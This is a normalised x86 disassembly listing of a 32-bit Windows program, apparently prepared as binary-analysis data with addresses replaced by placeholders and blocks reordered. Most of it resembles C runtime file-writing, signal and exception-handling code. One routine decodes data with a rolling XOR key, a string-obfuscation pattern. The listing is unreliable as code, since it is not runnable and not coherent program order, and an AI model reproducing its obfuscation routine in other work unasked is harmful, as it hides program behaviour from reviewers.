mov [ ebp - 0x14 ] edi
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ rw-data ]
call sub_40b1f0
mov eax [ rw-data ]
mov esi [ rw-data ]
sub esi eax
add esp 0x4
sar esi 0x3
test eax eax
je r-xdata
lea edx [ edi + ebx * 8 ]
lea eax [ edi + esi * 8 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] edi
push eax
call sub_408b16
add esp 0x4
sub_402116
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
pop ebp
retn
sub_40213c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40ebf7
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_401085
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40ebf7
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40ebf7
push 0x1
mov edi eax
call sub_40ebf7
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40d625
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4021d8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_404c41
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_40f84f
mov [ eax ] ebx
call sub_40c515
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_4150db
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_40db78
add esp 0x10
test eax eax
je r-xdata
sub_4022a0
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_4022f1
push 0xc
push r--data
call sub_413ff0
call sub_40c968
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_40dd53
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40235e
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_40c968
mov esi [ eax + 0x6c ]
mov eax esi
call sub_414035
retn
push 0x20
call sub_4103d9
sub_40236a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_402390
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_4023bf
push 0x10
push r--data
call sub_413ff0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_402481
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40c968
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_414035
retn
call sub_40ffac
call sub_40ffac
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_415070
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40249b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4024c0
push esi
mov esi eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
push edi
mov edi [ esi + 0x4 ]
push edi
push eax
mov ecx esi
call sub_40d4b0
mov [ edi + 0x4 ] eax
mov ecx [ ebx + 0x8 ]
mov edx [ esi + 0x4 ]
mov [ esi + 0x8 ] ecx
mov eax [ edx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov [ edx ] edx
mov esi [ esi + 0x4 ]
pop edi
mov [ esi + 0x8 ] esi
pop esi
retn
mov ecx [ eax ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov [ edx ] eax
mov esi [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x31 ] 0x0
je r-xdata
pop edi
mov [ esi + 0x8 ] ecx
pop esi
retn
mov edi edi
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
sub_402540
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_4066cf
add esp 0x4
test eax eax
jne r-xdata
sub_4025a0
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_402611
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40c968
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_414cf0
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4023bf
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4026f7
push 0x10
push r--data
call sub_413ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_414035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40bc2e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_402b34
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4027c3
mov eax [ ebp - 0x1c ]
sub_4027d0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
lea eax [ ecx * 4 ]
push eax
call sub_4066cf
add esp 0x4
test eax eax
jne r-xdata
sub_402824
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_402856
push 0x20
push r--data
call sub_413ff0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_404bc8
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_414035
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_413fa8
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_410f49
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40723f
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_401c91
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4029bd
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_402a00
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_402a4b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_40381b
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_402a90
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_402acd
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40b4fd
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_402af2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_4019da
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_40b635
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_402b34
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_4148b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_406d2b
mov [ eax ] edi
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_401400
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
jmp r-xdata
push esi
call sub_40a117
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_401b7b
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_40c968
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_40f84f
mov [ eax ] 0x1c
call sub_406d2b
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_401085
pop ecx
jmp r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40a628
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_4018fb
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_411301
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_411301
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_4018fb
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
